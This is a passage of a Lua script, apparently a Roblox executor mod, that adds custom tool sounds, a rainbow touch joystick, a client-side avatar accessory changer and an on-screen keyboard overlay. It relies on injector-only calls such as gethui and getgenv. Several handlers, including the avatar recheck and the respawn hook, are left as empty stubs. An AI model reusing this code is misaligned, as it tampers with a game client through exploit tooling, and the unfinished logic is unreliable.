local function play() if not S.customSoundsEnabled then return end cs:Stop();cs.TimePosition=data.skip or 0;cs:Play() if data.doublePlay then e.timer=task.delay(data.delay or 0.5,function() if S.customSoundsEnabled and cs.Parent then cs:Stop();cs:Play() end end) end end
for _,s in ipairs(tool:GetDescendants()) do if s:IsA("Sound") and s~=cs then e.volumes[s]=s.Volume;e.conns[#e.conns+1]=s:GetPropertyChangedSignal("Playing"):Connect(function() if s.Playing then s.Volume=0;s:Stop();play() end end) end end
end
 function setSounds(on) S.customSoundsEnabled=on==true if on then eachTool(hookSounds) else for t in pairs(ToolEditor.soundTracked) do clearSound(t) end end end
ToolEditor.setEnabled=setCustomTools;ToolEditor.setSkin=setSkin;ToolEditor.setRainbow=setRainbow;ToolEditor.setTransparency=applyTransparency;ToolEditor.setSounds=setSounds;ToolEditor.assets=TOOL_ASSETS

-- ============================================================
-- RAINBOW MOBILE JOYSTICK (portado do Zombie.vs Mobile v2 v6)
-- Pinta em arco-iris o thumbstick e o botao de pulo dos controles touch.
-- ============================================================
S.rainbowJoystickEnabled = S.rainbowJoystickEnabled == true
do
  local conns = {}
  local renderConn = nil
  local targets = {}
  local startRJ, stopRJ
  local function _pgui() return LP:FindFirstChild("PlayerGui") or LP:FindFirstChildOfClass("PlayerGui") end
  local function restoreAll()
    for obj, info in pairs(targets) do
      if obj and obj.Parent then pcall(function() obj[info.prop] = info.orig end) end
    end
    targets = {}
  end
  local function addTarget(obj)
    if targets[obj] then return end
    if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
      targets[obj] = {prop = "ImageColor3", orig = obj.ImageColor3}
    elseif obj:IsA("Frame") then
      targets[obj] = {prop = "BackgroundColor3", orig = obj.BackgroundColor3}
    end
  end
  local function rescan()
    local pg = _pgui() if not pg then return end
    local touchGui = pg:FindFirstChild("TouchGui") if not touchGui then return end
    for _, v in ipairs(touchGui:GetDescendants()) do
      if v:IsA("ImageLabel") or v:IsA("Frame") then
        local n = v.Name:lower()
        if n:find("thumbstick") or n:find("stick") then addTarget(v) end
      end
    end
    local tcf = touchGui:FindFirstChild("TouchControlFrame")
    if tcf then
      for _, v in ipairs(tcf:GetDescendants()) do
        if v:IsA("ImageButton") then
          addTarget(v)
          for _, d in ipairs(v:GetDescendants()) do
            if d:IsA("ImageLabel") then addTarget(d) end
          end
          break
        end
      end
    end
  end
  stopRJ = function()
    for _, c in ipairs(conns) do pcall(function() c:Disconnect() end) end
    conns = {}
    if renderConn then pcall(function() renderConn:Disconnect() end) renderConn = nil end
    restoreAll()
  end
  startRJ = function()
    stopRJ()
    rescan()
    local pg = _pgui()
    if pg then
      table.insert(conns, pg.ChildAdded:Connect(function(ch)
        if ch.Name == "TouchGui" and S.rainbowJoystickEnabled then
          task.wait(0.2)
          if S.rainbowJoystickEnabled then startRJ() end
        end
      end))
      local touchGui = pg:FindFirstChild("TouchGui")
      if touchGui then
        table.insert(conns, touchGui.DescendantAdded:Connect(function()
          task.wait(0.2)
          if S.rainbowJoystickEnabled then rescan() end
        end))
      end
    end
    renderConn = RunService.RenderStepped:Connect(function()
      local t = tick() * 2
      local color = Color3.new(
        math.sin(t) * 0.5 + 0.5,
        math.sin(t + 2) * 0.5 + 0.5,
        math.sin(t + 4) * 0.5 + 0.5
      )
      for obj, info in pairs(targets) do
        if obj and obj.Parent then obj[info.prop] = color else targets[obj] = nil end
      end
    end)
  end
  F.setRainbowJoystick = function(on)
    on = on and true or false
    S.rainbowJoystickEnabled = on
    if on then startRJ() else stopRJ() end
  end
end
F.ToolEditor=ToolEditor
LP.CharacterAdded:Connect(function() task.wait(0.7);if S.customToolsEnabled then refreshTools() end;if S.customSoundsEnabled then eachTool(hookSounds) end;if S.transparentToolsEnabled then applyTransparency(true) end end)

-- ===== [Zombie.Vs] CUSTOM AVATAR CHANGER (1MB behavior) =====
 AvatarChanger = { cache = {}, generation = 0, uiRefresh = {}, _watchFails = {}, _watchLastTry = {}, _watchConns = {}, _watchPending = false }
 AVATAR_CATEGORIES = {
    {name="Hair", assetTypes={Enum.AvatarAssetType.HairAccessory}},
    {name="Hats", assetTypes={Enum.AvatarAssetType.Hat}},
    {name="Face", assetTypes={Enum.AvatarAssetType.FaceAccessory}},
    {name="Neck", assetTypes={Enum.AvatarAssetType.NeckAccessory}},
    {name="Shoulder", assetTypes={Enum.AvatarAssetType.ShoulderAccessory}},
    {name="Front", assetTypes={Enum.AvatarAssetType.FrontAccessory}},
    {name="Back", assetTypes={Enum.AvatarAssetType.BackAccessory}},
    {name="Waist", assetTypes={Enum.AvatarAssetType.WaistAccessory}},
    {name="Shirts", assetTypes={Enum.AvatarAssetType.Shirt}},
    {name="Pants", assetTypes={Enum.AvatarAssetType.Pants}},
    {name="T-Shirts", assetTypes={Enum.AvatarAssetType.TShirt}},
    {name="Jackets", assetTypes={Enum.AvatarAssetType.JacketAccessory}},
    {name="Sweaters", assetTypes={Enum.AvatarAssetType.SweaterAccessory}},
    {name="Bottoms", assetTypes={Enum.AvatarAssetType.ShortsAccessory}},
}
S.customAvatarChanger = S.customAvatarChanger or {}
for _, category in ipairs(AVATAR_CATEGORIES) do
    S.customAvatarChanger[category.name] = S.customAvatarChanger[category.name] or {enabled=false,savedId=nil,savedName=""}
end
 function avatarEntry(name)
    S.customAvatarChanger[name] = S.customAvatarChanger[name] or {enabled=false,savedId=nil,savedName=""}
    return S.customAvatarChanger[name]
end
 function avatarCategoryByName(categoryName)
    for _, category in ipairs(AVATAR_CATEGORIES) do
        if category.name == categoryName then return category end
    end
    return nil
end
 function avatarWaitCharacter(character, timeout)
    character = character or LP.Character
    if not character then return false end
    local deadline = os.clock() + (tonumber(timeout) or 5)
    while character and character.Parent and os.clock() < deadline do
        if LP.Character and LP.Character ~= character then return false end
        if character:FindFirstChild("Head") and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChildOfClass("Humanoid") then return true end
        task.wait(0.05)
    end
    return false
end
 function avatarIsHairAccessory(accessory)
    if not accessory or not accessory:IsA("Accessory") then return false end
    local n = tostring(accessory.Name or ""):lower()
    if n:find("hair", 1, true) then return true end
    local h = accessory:FindFirstChild("Handle")
    return h and h:FindFirstChild("HairAttachment") ~= nil
end
 function avatarRemoveItem(assetType, itemName)
    local character = LP.Character
    if not character then return end
    pcall(function()
        if assetType == Enum.AvatarAssetType.Shirt then
            for _, child in ipairs(character:GetChildren()) do
                if child:IsA("Shirt") and (child.Name == "ACShirt" or child.Name == itemName or child:GetAttribute("ZombieVSAvatarItem") == itemName) then child:Destroy() end
            end
        elseif assetType == Enum.AvatarAssetType.Pants then
            for _, child in ipairs(character:GetChildren()) do
                if child:IsA("Pants") and (child.Name == "ACPants" or child.Name == itemName or child:GetAttribute("ZombieVSAvatarItem") == itemName) then child:Destroy() end
            end
        elseif assetType == Enum.AvatarAssetType.TShirt then
            for _, child in ipairs(character:GetChildren()) do
                if child:IsA("ShirtGraphic") and (child.Name == "ACTShirt" or child.Name == itemName or child:GetAttribute("ZombieVSAvatarItem") == itemName) then child:Destroy() end
            end
        elseif assetType == Enum.AvatarAssetType.HairAccessory then
            for _, child in ipairs(character:GetChildren()) do
                if child:IsA("Accessory") and (child.Name == "AC" .. tostring(itemName or "") or child.Name == itemName or child:GetAttribute("ZombieVSAvatarItem") == itemName or avatarIsHairAccessory(child)) then child:Destroy() end
            end
        else
            for _, child in ipairs(character:GetChildren()) do
                if child:IsA("Accessory") and (child.Name == "AC" .. tostring(itemName or "") or child.Name == itemName or child:GetAttribute("ZombieVSAvatarItem") == itemName) then child:Destroy() end
            end
        end
    end)
end
 function avatarRemove(categoryName, itemName)
    local category = avatarCategoryByName(categoryName)
    local assetType = category and category.assetTypes and category.assetTypes[1]
    if assetType then avatarRemoveItem(assetType, itemName or "") end
end
 function avatarPickCore(item)
    if not item then return nil end
    if item:IsA("Folder") or item:IsA("Model") then
        return item:FindFirstChildOfClass("Accessory")
            or item:FindFirstChildOfClass("Shirt")
            or item:FindFirstChildOfClass("Pants")
            or item:FindFirstChildOfClass("ShirtGraphic")
            or item:FindFirstChildWhichIsA("Accessory", true)
            or item:FindFirstChildWhichIsA("Shirt", true)
            or item:FindFirstChildWhichIsA("Pants", true)
            or item:FindFirstChildWhichIsA("ShirtGraphic", true)
    end
    if item:IsA("Accessory") or item:IsA("Hat") or item:IsA("Shirt") or item:IsA("Pants") or item:IsA("ShirtGraphic") then return item end
    return nil
end
 function avatarGetObject(itemId)
    local cached = AvatarChanger.cache[itemId]
    if cached then return cached:Clone() end
    local objects = nil
    local ok = pcall(function() objects = game:GetObjects("rbxassetid://" .. tostring(itemId)) end)
    if not ok or not objects or #objects == 0 then return nil end
    local core = avatarPickCore(objects[1])
    if not core then
        for _, obj in ipairs(objects) do core = avatarPickCore(obj); if core then break end end
    end
    if core then pcall(function() AvatarChanger.cache[itemId] = core:Clone() end) end
    return core and core:Clone() or nil
end
 function avatarEquipItem(itemId, itemType, itemName, generation)
    itemId = tonumber(itemId)
    if not itemId then return false end
    generation = generation or AvatarChanger.generation
    local ok, applied; do local __m = {pcall(function()
        local item = avatarGetObject(itemId)
        if generation ~= AvatarChanger.generation then if item then pcall(function() item:Destroy() end) end return false end
        local character = LP.Character
        if not character or not character.Parent then if item then pcall(function() item:Destroy() end) end return false end
        if not avatarWaitCharacter(character, 5) then if item then pcall(function() item:Destroy() end) end return false end
        if generation ~= AvatarChanger.generation then if item then pcall(function() item:Destroy() end) end return false end
        if not item then return false end
        if item:IsA("Shirt") then
            for _, child in ipairs(character:GetChildren()) do if child:IsA("Shirt") then child:Destroy() end end
            item.Name = "ACShirt"
            pcall(function() item:SetAttribute("ZombieVSAvatarItem", tostring(itemName or "")) end)
            item.Parent = character
            return true
        elseif item:IsA("Pants") then
            for _, child in ipairs(character:GetChildren()) do if child:IsA("Pants") then child:Destroy() end end
            item.Name = "ACPants"
            pcall(function() item:SetAttribute("ZombieVSAvatarItem", tostring(itemName or "")) end)
            item.Parent = character
            return true
        elseif item:IsA("ShirtGraphic") then
            for _, child in ipairs(character:GetChildren()) do if child:IsA("ShirtGraphic") then child:Destroy() end end
            item.Name = "ACTShirt"
            pcall(function() item:SetAttribute("ZombieVSAvatarItem", tostring(itemName or "")) end)
            item.Parent = character
            return true
        elseif item:IsA("Accessory") or item:IsA("Hat") then
            local handle = item:FindFirstChild("Handle") or item:FindFirstChildWhichIsA("BasePart", true)
            if not handle then pcall(function() item:Destroy() end) return false end
            if itemType == Enum.AvatarAssetType.HairAccessory then
                for _, child in ipairs(character:GetChildren()) do if avatarIsHairAccessory(child) then pcall(function() child:Destroy() end) end end
            else
                for _, child in ipairs(character:GetChildren()) do
                    if child:IsA("Accessory") and (child.Name == tostring(itemName or "") or child.Name == "AC" .. tostring(itemName or "") or child:GetAttribute("ZombieVSAvatarItem") == itemName) then pcall(function() child:Destroy() end) end
                end
            end
            local attachment = handle:FindFirstChildOfClass("Attachment")
            local targetPart = character:FindFirstChild("Head")
            local targetAttachment = nil
            if attachment then
                for _, bodyPart in ipairs(character:GetChildren()) do
                    if bodyPart:IsA("BasePart") then
                        targetAttachment = bodyPart:FindFirstChild(attachment.Name)
                        if targetAttachment then targetPart = bodyPart; break end
                    end
                end
            end
            if not targetPart then targetPart = character:FindFirstChild("HumanoidRootPart") end
            if not targetPart then pcall(function() item:Destroy() end) return false end
            item.Name = "AC" .. tostring(itemName or item.Name or itemId)
            pcall(function() item:SetAttribute("ZombieVSAvatarItem", tostring(itemName or "")) end)
            item.Parent = character
            handle.CanCollide = false
            pcall(function() handle.CanTouch = false; handle.CanQuery = false; handle.Massless = true end)
            handle.CFrame = targetPart.CFrame
            for _, joint in ipairs(handle:GetChildren()) do
                if joint:IsA("Weld") or joint:IsA("ManualWeld") or joint:IsA("WeldConstraint") then pcall(function() joint:Destroy() end) end
            end
            local weld = Instance.new("Weld")
            weld.Name = "ACManualWeld"
            weld.Part0 = handle
            weld.Part1 = targetPart
            if attachment and targetAttachment then
                weld.C0 = attachment.CFrame
                weld.C1 = targetAttachment.CFrame
            else
                weld.C0 = CFrame.new(0, 0.5, 0)
            end
            weld.Parent = handle
            return true
        end
        pcall(function() item:Destroy() end)
        return false
    end)}; ok = __m[1]; applied = __m[2]; end
    return ok and applied == true
end
 function avatarEquipRetry(categoryName, assetType, itemId, itemName, generation)
    for attempt = 1, 3 do
        if generation and generation ~= AvatarChanger.generation then return false end
        if avatarEquipItem(itemId, assetType, itemName, generation) then return true end
        task.wait(0.25 * attempt)
    end
    return false
end
function AvatarChanger.setEnabled(categoryName, enabled)
    local entry = avatarEntry(categoryName)
    entry.enabled = enabled == true
    local category = avatarCategoryByName(categoryName)
    local assetType = category and category.assetTypes and category.assetTypes[1]
    if entry.enabled and entry.savedId and assetType then
        task.spawn(avatarEquipRetry, categoryName, assetType, entry.savedId, entry.savedName, AvatarChanger.generation)
    else
        avatarRemove(categoryName, entry.savedName or "")
    end
    if AvatarChanger.uiRefresh[categoryName] then pcall(AvatarChanger.uiRefresh[categoryName], entry.enabled) end
    pcall(F.saveConfig)
end
function AvatarChanger.setItem(categoryName, assetType, itemId, itemName)
    local entry = avatarEntry(categoryName)
    if entry.enabled and entry.savedId then avatarRemoveItem(assetType, entry.savedName or "") end
    entry.savedId = tonumber(itemId)
    entry.savedName = tostring(itemName or "")
    if entry.enabled then task.spawn(avatarEquipRetry, categoryName, assetType, entry.savedId, entry.savedName, AvatarChanger.generation) end
    pcall(F.saveConfig)
end
function AvatarChanger.applyAll(generation)
    generation = generation or AvatarChanger.generation
    local character = LP.Character
    if not character or not avatarWaitCharacter(character, 10) then return end
    if generation ~= AvatarChanger.generation then return end
    for _, category in ipairs(AVATAR_CATEGORIES) do
        if generation ~= AvatarChanger.generation then return end
        local entry = avatarEntry(category.name)
        if entry.enabled and entry.savedId then
            avatarEquipRetry(category.name, category.assetTypes[1], entry.savedId, entry.savedName, generation)
            task.wait(0.05)
        end
    end
end
function AvatarChanger.load(data)
    if type(data) ~= "table" then return end
    for _, category in ipairs(AVATAR_CATEGORIES) do
        local incoming = data[category.name]
        if type(incoming) == "table" then
            local entry = avatarEntry(category.name)
            entry.enabled = incoming.enabled == true
            entry.savedId = tonumber(incoming.savedId)
            entry.savedName = tostring(incoming.savedName or "")
        end
    end
end
function AvatarChanger.export()
    local out = {}
    for _, category in ipairs(AVATAR_CATEGORIES) do
        local entry = avatarEntry(category.name)
        out[category.name] = {enabled=entry.enabled==true,savedId=entry.savedId,savedName=entry.savedName or ""}
    end
    return out
end
function AvatarChanger.reset()
    for _, category in ipairs(AVATAR_CATEGORIES) do
        local entry = avatarEntry(category.name)
        if entry.enabled and entry.savedId then avatarRemoveItem(category.assetTypes[1], entry.savedName or "") end
        entry.enabled=false;entry.savedId=nil;entry.savedName=""
        if AvatarChanger.uiRefresh[category.name] then pcall(AvatarChanger.uiRefresh[category.name],false) end
    end
    pcall(F.saveConfig)
end
 function avatarExpected(category, entry)
    local assetType = category.assetTypes[1]
    if assetType == Enum.AvatarAssetType.Shirt then return "ACShirt", "Shirt" end
    if assetType == Enum.AvatarAssetType.Pants then return "ACPants", "Pants" end
    if assetType == Enum.AvatarAssetType.TShirt then return "ACTShirt", "ShirtGraphic" end
    return "AC" .. tostring(entry.savedName or ""), "Accessory"
end
 function avatarIsPresent(character, category, entry)
    local expectedName, className; do local __m = {avatarExpected(category, entry)}; expectedName = __m[1]; className = __m[2]; end
    for _, child in ipairs(character:GetChildren()) do
        if child:IsA(className) and (child.Name == expectedName or child.Name == entry.savedName or child:GetAttribute("ZombieVSAvatarItem") == entry.savedName) then return true end
    end
    return false
end
function AvatarChanger.recheck()
    local character = LP.Character
    if not character or not character.Parent then return end
    local hum = character:FindFirstChildOfClass("Humanoid")
    if hum and hum.Health <= 0 then return end
    local now = tick()
    for _, category in ipairs(AVATAR_CATEGORIES) do
        local entry = avatarEntry(category.name)
        if entry.enabled and entry.savedId then
            if avatarIsPresent(character, category, entry) then
                AvatarChanger._watchFails[category.name] = nil
            else
                local fails = AvatarChanger._watchFails[category.name] or 0
                local waitTime = math.min(0.6 * (2 ^ math.min(fails, 5)), 20)
                if (now - (AvatarChanger._watchLastTry[category.name] or 0)) > waitTime then
                    AvatarChanger._watchLastTry[category.name] = now
                    local gen = AvatarChanger.generation
                    local catName, assetType, itemId, itemName = category.name, category.assetTypes[1], entry.savedId, entry.savedName
                    
                end
            end
        end
    end
end
 function avatarRequestRecheck(delaySec)
    if AvatarChanger._watchPending then return end
    AvatarChanger._watchPending = true
    task.delay(delaySec or 0.1, function()
        AvatarChanger._watchPending = false
        pcall(AvatarChanger.recheck)
    end)
end
 function avatarHookCharacter(character)
    for _, conn in ipairs(AvatarChanger._watchConns) do pcall(function() conn:Disconnect() end) end
    AvatarChanger._watchConns = {}
    if not character then return end
    table.insert(AvatarChanger._watchConns, character.ChildRemoved:Connect(function(child)
        if child:IsA("Accessory") or child:IsA("Shirt") or child:IsA("Pants") or child:IsA("ShirtGraphic") then avatarRequestRecheck(0.05) end
    end))
    local hum = character:FindFirstChildOfClass("Humanoid")
    if hum then table.insert(AvatarChanger._watchConns, hum.HealthChanged:Connect(function() avatarRequestRecheck(0.15) end)) end
end
_G._ZombieVsAvatarChangerRecheck = function()
    AvatarChanger._watchFails = {}
    pcall(AvatarChanger.recheck)
end
LP.CharacterAdded:Connect(function(char)
    AvatarChanger.generation = AvatarChanger.generation + 1
    AvatarChanger._watchFails = {}
    local gen = AvatarChanger.generation
    
end)
if LP.Character then
    
end

F.AvatarChanger = AvatarChanger
-- ===== [Zombie.Vs] END CUSTOM AVATAR CHANGER =====

 _kbOverlay = { screen = nil, conns = {}, buttons = {}, enabled = false, panel = nil, }  function _kbDisconnectAll() for _, c in ipairs(_kbOverlay.conns) do pcall(function() c:Disconnect() end) end
_kbOverlay.conns = {} end  function _kbTrack(conn) table.insert(_kbOverlay.conns, conn) return conn end function F.stopKeyboardOverlay() S.keyboardOverlayEnabled = false; _kbOverlay.enabled = false; _kbDisconnectAll() if _kbOverlay.screen then pcall(function() _kbOverlay.screen:Destroy() end) _kbOverlay.screen = nil end _kbOverlay.buttons = {}; _kbOverlay.panel = nil pcall(function() local env = (type(getgenv) == "function" and getgenv()) or _G if env.__VersincKeyboardOverlay then env.__VersincKeyboardOverlay = nil end end) end function F.startKeyboardOverlay()
if _kbOverlay.enabled and _kbOverlay.screen and _kbOverlay.screen.Parent then S.keyboardOverlayEnabled = true return end F.stopKeyboardOverlay(); S.keyboardOverlayEnabled = true _kbOverlay.enabled = true; local guiParent = nil pcall(function() if type(gethui) == "function" then guiParent = gethui() end end) if not guiParent then pcall(function() guiParent = game:GetService("CoreGui") end) end if not guiParent then guiParent = LP:FindFirstChild("PlayerGui") or LP:WaitForChild("PlayerGui", 3) end if not guiParent then return end local CONFIG = { guiName = "VersincKeyboardOverlay", uiScale = 1.0,
keySize = 30, keyGap = 4, mouseWidth = 58, mouseHeight = 92, mouseGap = 16, trackSpeed = 1500, trackAttack = 0.65, trackRelease = 0.18, toggleKey = Enum.KeyCode.F8, hideWhileTyping = true, wheelFlash = 0.13, fadeIn = 0.03, fadeOut = 0.11, defaultPos = Vector2.new(0.025, 0.62), } local THEME = { panelFill = Color3.fromRGB(0, 0, 0), panelIdle = 0.40, keyFill = Color3.fromRGB(0, 0, 0), keyIdle = 0.05, pressFill = Color3.fromRGB(255, 255, 255), pressIdle = 0.00, line = Color3.fromRGB(255, 255, 255), lineIdle = 0.35, lineActive = 0.00, textIdle = Color3.fromRGB(255, 255, 255),
textActive = Color3.fromRGB(0, 0, 0), textStroke = 0.70, headerIdle = 0.30, headerLocked = 1.00, font = Enum.Font.GothamBold, fontCaption = Enum.Font.Gotham, } local KEYBOARD_ROWS = { { { id = "Escape", label = "ESC", w = 1.5 }, { id = "One", label = "1" }, { id = "Two", label = "2" }, { id = "Three", label = "3" }, { id = "Four", label = "4" }, { id = "Five", label = "5" }, }, { { id = "Tab", label = "TAB", w = 1.5 }, { id = "Q", label = "Q" }, { id = "W", label = "W" }, { id = "E", label = "E" }, { id = "R", label = "R" }, { id = "T", label = "T" }, }, {
{ id = "CapsLock", label = "CAPS", w = 1.75 }, { id = "A", label = "A" }, { id = "S", label = "S" }, { id = "D", label = "D" }, { id = "F", label = "F" }, { id = "G", label = "G" }, }, { { id = "LeftShift", label = "SHIFT", w = 2.25 }, { id = "Z", label = "Z" }, { id = "X", label = "X" }, { id = "C", label = "C" }, { id = "V", label = "V" }, { id = "B", label = "B" }, }, { { id = "LeftControl", label = "CTRL", w = 1.5 }, { id = "LeftAlt", label = "ALT", w = 1.25 }, { id = "Space", label = "SPACE", w = 3.5 }, }, } local function new(class, props, children) local inst = Instance.new(class)
for key, value in pairs(props or {}) do if key ~= "Parent" then inst[key] = value end end for _, child in ipairs(children or {}) do child.Parent = inst end if props and props.Parent then inst.Parent = props.Parent end return inst end local function kTween(inst, duration, props) TS:Create(inst, TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props):Play() end local Cell = {}; Cell.__index = Cell function Cell.new(fill, stroke, label) return setmetatable({ fill = fill, stroke = stroke, label = label, active = false }, Cell) end function Cell:setActive(on)
if self.active == on then return end self.active = on; local duration = on and CONFIG.fadeIn or CONFIG.fadeOut if self.frame then kTween(self.frame, duration, { BackgroundColor3 = on and THEME.pressFill or THEME.keyFill, BackgroundTransparency = on and THEME.pressIdle or THEME.keyIdle, }) end if self.fill and not self.analog then kTween(self.fill, duration, { BackgroundColor3 = THEME.pressFill, BackgroundTransparency = on and THEME.pressIdle or 1, }) end if self.stroke then kTween(self.stroke, duration, { Color = THEME.line, Transparency = on and THEME.lineActive or THEME.lineIdle, }) end
if self.label and not self.analog then kTween(self.label, duration, { TextColor3 = on and THEME.textActive or THEME.textIdle, TextStrokeTransparency = on and 1 or THEME.textStroke, }) end if self.dot then self.dot.BackgroundColor3 = on and Color3.new(0, 0, 0) or THEME.pressFill; self.dot.BackgroundTransparency = on and 0 or 0.15 end end function Cell:flash(duration) self.flashToken = (self.flashToken or 0) + 1; local token = self.flashToken; self:setActive(true) task.delay(duration or CONFIG.wheelFlash, function() if self.flashToken == token then self:setActive(false) end end) end
local function makeKey(parent, def, rect) local cornerR = def.circle and UDim.new(1, 0) or UDim.new(0, 5) local frame = new("Frame", { Name = def.id or "Key", BackgroundColor3 = THEME.keyFill, BackgroundTransparency = THEME.keyIdle, BorderSizePixel = 0, ClipsDescendants = true, Position = UDim2.fromOffset(rect.x, rect.y), Size = UDim2.fromOffset(rect.w, rect.h), Parent = parent, }, { new("UICorner", { CornerRadius = cornerR }) }) local stroke = new("UIStroke", { Color = THEME.line, Thickness = 1.4, Transparency = THEME.lineIdle, ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = frame, })
local fill = new("Frame", { Name = "Fill", BackgroundColor3 = THEME.pressFill, BackgroundTransparency = 1, BorderSizePixel = 0, Size = UDim2.fromScale(1, 1), ZIndex = 2, Parent = frame, }, { new("UICorner", { CornerRadius = cornerR }) }) local label if def.label then label = new("TextLabel", { BackgroundTransparency = 1, Size = UDim2.fromScale(1, 1), Font = THEME.font, Text = def.label, TextColor3 = THEME.textIdle, TextScaled = true, TextStrokeColor3 = Color3.new(0, 0, 0), TextStrokeTransparency = THEME.textStroke, ZIndex = 3, Parent = frame, }, { new("UIPadding", {
PaddingLeft = UDim.new(0, 3), PaddingRight = UDim.new(0, 3), PaddingTop = UDim.new(0, 2), PaddingBottom = UDim.new(0, 2), }), new("UITextSizeConstraint", { MaxTextSize = math.max(9, math.floor(rect.h * 0.55)) }), }) end local cell = Cell.new(fill, stroke, label); cell.frame = frame return cell end pcall(function() local old = guiParent:FindFirstChild(CONFIG.guiName) if old then old:Destroy() end end) local screen = new("ScreenGui", { Name = CONFIG.guiName, ResetOnSpawn = false, IgnoreGuiInset = true, DisplayOrder = 9999, ZIndexBehavior = Enum.ZIndexBehavior.Sibling, Parent = guiParent, })
_kbOverlay.screen = screen local HEADER_HEIGHT, PADDING = 18, 8; local unit = CONFIG.keySize + CONFIG.keyGap; local widestRow = 0 for _, row in ipairs(KEYBOARD_ROWS) do local total = 0 for _, def in ipairs(row) do total = total + (def.w or 1) end widestRow = math.max(widestRow, total) end local keysWidth = widestRow * unit - CONFIG.keyGap; local keysHeight = #KEYBOARD_ROWS * unit - CONFIG.keyGap local bodySize = Vector2.new( keysWidth + CONFIG.mouseGap + CONFIG.mouseWidth, math.max(keysHeight, CONFIG.mouseHeight) ) local root = new("Frame", { Name = "Panel", Active = false,
BackgroundColor3 = THEME.panelFill, BackgroundTransparency = THEME.panelIdle, BorderSizePixel = 0, Size = UDim2.fromOffset(bodySize.X + PADDING * 2, bodySize.Y + PADDING * 2 + HEADER_HEIGHT), Position = UDim2.fromScale(CONFIG.defaultPos.X, CONFIG.defaultPos.Y), Parent = screen, }, { new("UIScale", { Scale = CONFIG.uiScale }), new("UICorner", { CornerRadius = UDim.new(0, 10) }), }) new("UIStroke", { Color = THEME.line, Thickness = 1, Transparency = 0.85, ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = root, }) local header = new("Frame", { Name = "Handle", Active = true,
BackgroundColor3 = Color3.new(0, 0, 0), BackgroundTransparency = THEME.headerIdle, BorderSizePixel = 0, Size = UDim2.new(1, 0, 0, HEADER_HEIGHT), Parent = root, }, { new("UICorner", { CornerRadius = UDim.new(0, 8) }), new("UIPadding", { PaddingLeft = UDim.new(0, 8), PaddingRight = UDim.new(0, 5) }), }) new("TextLabel", { BackgroundTransparency = 1, Size = UDim2.new(1, -22, 1, 0), Font = THEME.fontCaption, Text = "KEYBOARD + MOUSE", TextSize = 10, TextXAlignment = Enum.TextXAlignment.Left, TextColor3 = THEME.textIdle, TextTransparency = 0.25, Parent = header, }) local body = new("Frame", {
Name = "Body", Active = false, BackgroundTransparency = 1, Position = UDim2.fromOffset(PADDING, HEADER_HEIGHT + PADDING), Size = UDim2.fromOffset(bodySize.X, bodySize.Y), Parent = root, }) local Buttons = {} for rowIndex, row in ipairs(KEYBOARD_ROWS) do local x = 0; local y = (rowIndex - 1) * unit for _, def in ipairs(row) do local width = (def.w or 1) * unit - CONFIG.keyGap local cell = makeKey(body, def, { x = math.floor(x), y = y, w = math.floor(width), h = CONFIG.keySize, }) if def.id then Buttons[def.id] = cell end x = x + (def.w or 1) * unit end end
local originX = keysWidth + CONFIG.mouseGap; local originY = math.floor((bodySize.Y - CONFIG.mouseHeight) / 2); local width, height = CONFIG.mouseWidth, CONFIG.mouseHeight; local radius = math.floor(width * 0.42); local topPart = math.floor(height * 0.40); local wheelW = math.max(7, math.floor(width * 0.16)); local sideW = math.floor((width - wheelW - 4) / 2) local mouseBody = new("Frame", { Name = "Mouse", BackgroundColor3 = THEME.keyFill, BackgroundTransparency = THEME.keyIdle, BorderSizePixel = 0, ClipsDescendants = true, Position = UDim2.fromOffset(originX, originY),
Size = UDim2.fromOffset(width, height), Parent = body, }, { new("UICorner", { CornerRadius = UDim.new(0, radius) }) }) new("UIStroke", { Color = THEME.line, Thickness = 1.4, Transparency = THEME.lineIdle, ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = mouseBody, }) local function makeMouseButton(name, clipX, fillX) local clip = new("Frame", { Name = name .. "Clip", BackgroundTransparency = 1, ClipsDescendants = true, Position = UDim2.fromOffset(clipX, 0), Size = UDim2.fromOffset(sideW, topPart), ZIndex = 2, Parent = mouseBody, }) local fill = new("Frame", {
Name = name, BackgroundColor3 = THEME.pressFill, BackgroundTransparency = 1, BorderSizePixel = 0, Position = UDim2.fromOffset(fillX, 0), Size = UDim2.fromOffset(sideW + radius, topPart + radius), Parent = clip, }, { new("UICorner", { CornerRadius = UDim.new(0, radius) }) }) local cell = Cell.new(fill, nil, nil) cell.frame = fill return cell end local mouseLeft = makeMouseButton("LeftButton", 0, 0); local mouseRight = makeMouseButton("RightButton", width - sideW, -radius); Buttons.Mouse1 = mouseLeft; Buttons.Mouse2 = mouseRight new("Frame", {
Name = "Split", BackgroundColor3 = THEME.line, BackgroundTransparency = 0.55, BorderSizePixel = 0, Position = UDim2.fromOffset(0, topPart), Size = UDim2.new(1, 0, 0, 1), ZIndex = 4, Parent = mouseBody, }) local wheelH = math.floor(topPart * 0.60) local wheel = new("Frame", { Name = "Wheel", BackgroundColor3 = THEME.keyFill, BackgroundTransparency = 0.1, BorderSizePixel = 0, ClipsDescendants = true, Position = UDim2.fromOffset(math.floor((width - wheelW) / 2), math.floor(topPart * 0.20)), Size = UDim2.fromOffset(wheelW, wheelH), ZIndex = 5, Parent = mouseBody,
}, { new("UICorner", { CornerRadius = UDim.new(0, math.floor(wheelW / 2)) }) }) local wheelStroke = new("UIStroke", { Color = THEME.line, Thickness = 1.2, Transparency = THEME.lineIdle, ApplyStrokeMode = Enum.ApplyStrokeMode.Border, Parent = wheel, }) local wheelFill = new("Frame", { Name = "Fill", BackgroundColor3 = THEME.pressFill, BackgroundTransparency = 1, BorderSizePixel = 0, Size = UDim2.fromScale(1, 1), ZIndex = 6, Parent = wheel, }, { new("UICorner", { CornerRadius = UDim.new(0, math.floor(wheelW / 2)) }) }) local mouseWheel = Cell.new(wheelFill, wheelStroke, nil)
